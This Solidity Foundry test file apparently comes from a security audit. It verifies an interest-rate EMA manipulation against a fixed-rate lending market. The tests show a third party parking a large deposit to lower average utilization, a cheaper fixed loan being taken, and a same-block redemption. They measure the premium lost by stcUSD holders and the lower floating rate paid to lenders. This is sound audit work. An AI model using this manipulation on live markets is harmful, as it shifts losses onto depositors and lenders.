// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { FixedMarket } from "../../../../../contracts/cap/market/FixedMarket.sol";
import { CapDeployer } from "../../../../../test/shared/CapDeployer.sol";

/// @notice Adversarial verification of H10 (MED-EMA-MANIPULATION). Same market shape as the PoC:
/// 2M idle reserve + 8M credit = 10M supply at the kink; a 1M / 30d fixed loan.
contract VerifyEmaManipulation is CapDeployer {
    uint256 internal constant RESERVE = 2_000_000e18;
    uint256 internal constant CREDIT = 8_000_000e18;
    uint256 internal constant LOAN = 1_000_000e18;
    uint256 internal constant PARK = 10_000_000e18;

    address internal lp = makeAddr("lp");
    address internal whale = makeAddr("whale"); // NOT the borrower, holds no role at all
    address internal borrower;
    address internal underwriter = makeAddr("underwriter");
    FixedMarket internal market;

    function setUp() public {
        vm.warp(1_000_000);
        _deployCap();
        irm.setLiquiditySlopes(capConfig.liquiditySlopes);
        borrower = defaultBorrower;
        (address m, address t0,) = _createFixedMarket("fixed");
        market = FixedMarket(m);
        market.setUnderwriterRate(0);
        market.setFixedCreditLimit(type(uint256).max);
        _fundTranche(t0, underwriter, 20_000_000e18);
        _depositStable(lp, RESERVE);
        _mintStable(makeAddr("other-borrower"), CREDIT);
        skip(irm.averagingPeriod());
        assertEq(irm.averageUtilization(), 0.8e27);
    }

    function _borrow(uint256 loan) internal returns (uint256 premium) {
        vm.prank(borrower);
        (uint256 id, uint256 principal) = market.borrow(borrower, loan, type(uint256).max);
        premium = market.debt(id) - principal;
    }

    /// (a)+(b): the depositor holds no role; redemption is instant per maxRedeem in the borrow block;
    /// the premium shortfall lands on the staked stablecoin (stcUSD holders).
    function test_thirdPartyDepositor_sameBlockRedeem_lossLandsOnStcUsd() public {
        address stcusd = capConfig.stablecoinYield;
        uint256 snap = vm.snapshotState();
        uint256 honestBefore = stablecoin.balanceOf(stcusd);
        uint256 honest = _borrow(LOAN);
        uint256 honestMinted = stablecoin.balanceOf(stcusd) - honestBefore;
        vm.revertToState(snap);

        _depositStable(whale, PARK);
        skip(irm.averagingPeriod());
        uint256 before = stablecoin.balanceOf(stcusd);
        uint256 attacked = _borrow(LOAN);
        uint256 attackedMinted = stablecoin.balanceOf(stcusd) - before;

        emit log_named_decimal_uint("maxRedeem(whale) in the borrow block", stablecoin.maxRedeem(whale), 18);
        assertGe(stablecoin.maxRedeem(whale), PARK, "instant path covers the whole park");
        vm.prank(whale);
        uint256 got = stablecoin.redeem(PARK, whale, whale);
        assertEq(got, PARK, "at par, same block");
        emit log_named_decimal_uint("stcUSD premium, honest", honestMinted, 18);
        emit log_named_decimal_uint("stcUSD premium, parked", attackedMinted, 18);
        assertEq(honestMinted, honest);
        assertEq(attackedMinted, attacked);
        assertLt(attacked, honest);
    }

    /// (b): a redemption queue that already exhausts the reserve does not trap the park: the park
    /// raises unlockedSupply by exactly D, and instantUnlockedSupply by D too once the queue is
    /// already covered by the pre-existing reserve.
    function test_existingQueueDoesNotTrapThePark() public {
        vm.prank(lp);
        stablecoin.requestRedeem(RESERVE, lp, lp); // queue == whole reserve
        assertEq(stablecoin.instantUnlockedSupply(), 0, "reserve fully spoken for");

        _depositStable(whale, PARK);
        skip(irm.averagingPeriod());
        _borrow(LOAN);
        emit log_named_decimal_uint(
            "instantUnlockedSupply post-borrow with 2M queue", stablecoin.instantUnlockedSupply(), 18
        );
        assertGe(stablecoin.maxRedeem(whale), PARK);
        vm.prank(whale);
        assertEq(stablecoin.redeem(PARK, whale, whale), PARK);
    }

    /// (d): the discount is bounded by the base rate: even an infinite park cannot push the fixed
    /// rate below `base`. Recompute the floor and the 30% figure independently.
    function test_discountBoundedByBase() public {
        uint256 snap = vm.snapshotState();
        uint256 honest = _borrow(LOAN);
        vm.revertToState(snap);

        _depositStable(whale, 1_000_000_000e18); // 100x the supply
        skip(irm.averagingPeriod());
        uint256 floor = _borrow(LOAN);
        uint256 baseOnly = LOAN * 30 days / 365 days * 5 / 100; // base 5% for 30 days
        emit log_named_decimal_uint("honest", honest, 18);
        emit log_named_decimal_uint("floor (base-rate) premium", floor, 18);
        emit log_named_decimal_uint("pure base premium", baseOnly, 18);
        emit log_named_uint("max discount (bps)", (honest - floor) * 10_000 / honest);
        assertApproxEqRel(floor, baseOnly, 0.02e18); // 9M/1.01B = 0.9% util leaves 1.1% over pure base
        // independent 30% figure: rate at 9/21 = 0.4286 -> 5% + 5%*0.4286/0.8 = 7.679%
        uint256 expected = LOAN * 30 days * 76786 / 1_000_000 / 365 days;
        emit log_named_decimal_uint("independent recompute of parked premium", expected, 18);
    }

    /// side effect: the park also lowers the floating liquidity rate for everyone during the window
    function test_floatingRateAlsoDropsDuringTheWindow() public {
        uint256 before = irm.liquidityRate();
        _depositStable(whale, PARK);
        uint256 during = irm.liquidityRate();
        emit log_named_decimal_uint("floating rate before park (%)", before / 1e25, 0);
        emit log_named_decimal_uint("floating rate during park (%)", during / 1e25, 0);
        // 8M floating credit for one hour at the rate gap
        uint256 lenderLoss = CREDIT * (before - during) / 1e27 * 1 hours / 365 days;
        emit log_named_decimal_uint("extra lender loss on floating credit over 1h", lenderLoss, 18);
        assertLt(during, before);
    }
}
